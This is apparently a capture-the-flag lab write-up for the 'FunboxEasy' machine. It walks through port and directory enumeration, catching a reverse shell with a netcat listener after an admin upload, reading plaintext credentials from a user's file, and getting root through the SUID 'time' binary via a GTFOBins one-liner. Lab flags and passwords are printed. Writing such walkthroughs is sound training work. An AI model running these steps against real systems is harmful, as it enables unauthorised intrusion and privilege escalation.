# FunboxEasy

- [Discovery](#discovery)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)

## Discovery

1) We run `nmap` to find open ports

```
┌──(kali㉿kali)-[~]
└─$ nmap -v -p- -T4 funboxeasy

...

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

2) We run `nmap` again with service version detection and default scripts

```
┌──(kali㉿kali)-[~]
└─$ nmap -v -p 22,80,33060 -T4 -A funboxeasy

...

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/3%Time=65E53C7D%P=aarch64-unknown-linux
   (... useless info about the mysqlx server omitted ...)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Off the bat we know we have a default Apache2 webserver with an entry in `robots.txt`.

3) Checking out the path disallowed in `robots.txt`:

![](./assets/gym.png)

4) Poking manually in the site, I find some keywords that I just type into `searchsploit` with no success

```
┌──(kali㉿kali)-[~]
└─$ searchsploit projectworlds              
Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ searchsploit skymbu       
Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ searchsploit pfdf         
Exploits: No Results
Shellcodes: No Results
```

5) Time to enumerate paths with `gobuster`

Enumering the `/gym/` path:

```
┌──(kali㉿kali)-[~/Desktop/src/offsec/vpn_profiles]
└─$ gobuster dir -u http://funboxeasy/gym -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://funboxeasy/gym
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 310] [--> http://funboxeasy/gym/img/]
/profile              (Status: 301) [Size: 314] [--> http://funboxeasy/gym/profile/]
/admin                (Status: 301) [Size: 312] [--> http://funboxeasy/gym/admin/]
/upload               (Status: 301) [Size: 313] [--> http://funboxeasy/gym/upload/]
/include              (Status: 301) [Size: 314] [--> http://funboxeasy/gym/include/]
/LICENSE              (Status: 200) [Size: 18025]
/att                  (Status: 301) [Size: 310] [--> http://funboxeasy/gym/att/]
/ex                   (Status: 301) [Size: 309] [--> http://funboxeasy/gym/ex/]
/boot                 (Status: 301) [Size: 311] [--> http://funboxeasy/gym/boot/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Enumering the `/` (root) path:

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://funboxeasy/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://funboxeasy/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/store                (Status: 301) [Size: 308] [--> http://funboxeasy/store/]
/admin                (Status: 301) [Size: 308] [--> http://funboxeasy/admin/]
/secret               (Status: 301) [Size: 309] [--> http://funboxeasy/secret/]
/gym                  (Status: 301) [Size: 306] [--> http://funboxeasy/gym/]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


6) Checking out the `/store` path

> admin login

> add a new book


```
┌──(kali㉿kali)-[~/Desktop/upload-me]
└─$ nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.45.199] from (UNKNOWN) [192.168.184.111] 43914
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Eventually find access flag

```
$ pwd
/var/www
$ ls -la
total 16
drwxr-xr-x  3 root     root     4096 Oct 30  2020 .
drwxr-xr-x 14 root     root     4096 Jul 30  2020 ..
drwxr-xr-x  6 root     root     4096 Jul 31  2020 html
-rw-r--r--  1 www-data www-data   33 Mar  4 03:11 local.txt
$ cat local.txt
4020a37711a5c3c7e130e97deaa0b0d6
```

Find tony's password:

```
$ cd /home
$ ls
tony
$ cd tony
$ ls -la
total 24
drwxr-xr-x 2 tony tony 4096 Oct 30  2020 .
drwxr-xr-x 3 root root 4096 Jul 30  2020 ..
-rw------- 1 tony tony    0 Oct 30  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tony tony 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 tony tony  807 Feb 25  2020 .profile
-rw-rw-r-- 1 tony tony   70 Jul 31  2020 password.txt
$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

we are tony

```
┌──(kali㉿kali)-[~/Desktop/src/offsec/vpn_profiles]
└─$ ssh tony@funboxeasy
The authenticity of host 'funboxeasy (192.168.184.111)' can't be established.
ED25519 key fingerprint is SHA256:sMY2EwBNywi3V/cmpdMCtvcC6NM31k0H9CTRlsxALfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'funboxeasy' (ED25519) to the list of known hosts.
tony@funboxeasy's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar  4 03:55:58 UTC 2024

  System load:  0.09              Processes:               159
  Usage of /:   77.3% of 4.66GB   Users logged in:         0
  Memory usage: 62%               IPv4 address for ens256: 192.168.184.111
  Swap usage:   0%

  => There is 1 zombie process.


60 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tony@funbox3:~$
```

time has suid

https://gtfobins.github.io/gtfobins/time/#suid

```
tony@funbox3:/$ ls -la /usr/bin/time
-rwsr-xr-x 1 root root 14720 Apr 21  2017 /usr/bin/time
tony@funbox3:/$ /usr/bin/time /bin/bash -p
bash-5.0# whoami
root
```

```
bash-5.0# ls -la /root | grep -e proof -e txt
-rw-------  1 root root   33 Mar  4 03:11 proof.txt
bash-5.0# cat /root/proof.txt
f5e7058e15f70b64233565b76acc66ef
```

Note that we never actually needed to be tony to get root. We could have just executed `/usr/bin/time bash -p` as `www-data` and we would've gotten root. 


---

Lesson: ALWAYS check GTFOBins as soon as you know what binaries have SUID.